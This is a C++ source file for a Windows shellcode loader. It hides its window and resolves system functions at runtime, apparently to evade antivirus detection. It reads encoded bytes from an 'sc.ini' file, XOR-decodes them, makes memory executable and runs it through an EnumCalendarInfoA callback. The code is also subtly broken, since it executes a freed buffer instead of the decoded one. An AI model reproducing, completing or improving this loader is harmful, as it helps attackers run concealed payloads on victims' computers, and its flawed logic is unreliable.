#define _CRT_SECURE_NO_DEPRECATE
#include<iostream>
#include<Windows.h>
#include<WinBase.h>
#include<stdlib.h>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
using namespace std;

typedef BOOL(WINAPI* EnumInfo)(
	CALINFO_ENUMPROCA	proc,
	LCID				Eocale,
	CALID				Calender,
	CALTYPE				Type
	);

typedef BOOL(WINAPI* Exchange_)(
	LPVOID		lpAddress,
	SIZE_T		DWsIZE,
	DWORD		New,
	PDWORD		Old
	);

typedef FARPROC(WINAPI* GetFuncAddr_)(
	HMODULE hmod,
	LPCSTR  lpName
	);


typedef UINT(WINAPI* GetfileInt)(
	LPCSTR			LPAPPNAME,
	LPCSTR			KEYNAME,
	INT				DEFINE,
	LPCSTR			FILENAME
	);

GetFuncAddr_ GetFuncAddr = (GetFuncAddr_)GetProcAddress(
	GetModuleHandleA("Kernel32.dll"),
	"GetProcAddress"
);
GetfileInt GetFileIntA = (GetfileInt)GetFuncAddr(
	GetModuleHandleA("kernel32.dll"),
	"GetPrivateProfileIntA"
);
Exchange_ exchange_ = (Exchange_)GetFuncAddr(
	GetModuleHandleA("kernel32.dll"),
	"VirtualProtect"
);

EnumInfo EnumInfoA = (EnumInfo)GetFuncAddr(
	GetModuleHandleA("Kernel32.dll"),
	"EnumCalendarInfoA"
	);

void decode() {
	char buf[3000];
	unsigned int bt[3000];
	CHAR PATH[MAX_PATH];
	GetCurrentDirectoryA(
		MAX_PATH, PATH
	);
	strcat(PATH, "\\sc.ini");
	cout << PATH;
	for (int i = 0; i < 3000; i++) {
		_itoa_s(i, buf, 10);
		UINT k = GetFileIntA(
			"key",
			buf, NULL, PATH
		);
		bt[i] = k;
	}
	unsigned char* a = (unsigned char*)malloc(sizeof(bt));
	free(a);
	unsigned char* b = (unsigned char*)malloc(sizeof(bt));
	for (int i = 0; i < (sizeof(bt) / sizeof(bt[0])); i++) {
		b[i] = (unsigned char)(bt[i] ^ 1024);
	}
	DWORD p;
	exchange_(
		a, sizeof(a), 0x40,&p
	);
	EnumInfoA(
		(CALINFO_ENUMPROCA)a, LOCALE_SYSTEM_DEFAULT, ENUM_ALL_CALENDARS, CAL_ICALINTVALUE
	);
}

int main() {
	 
	decode();

	return 0;
}
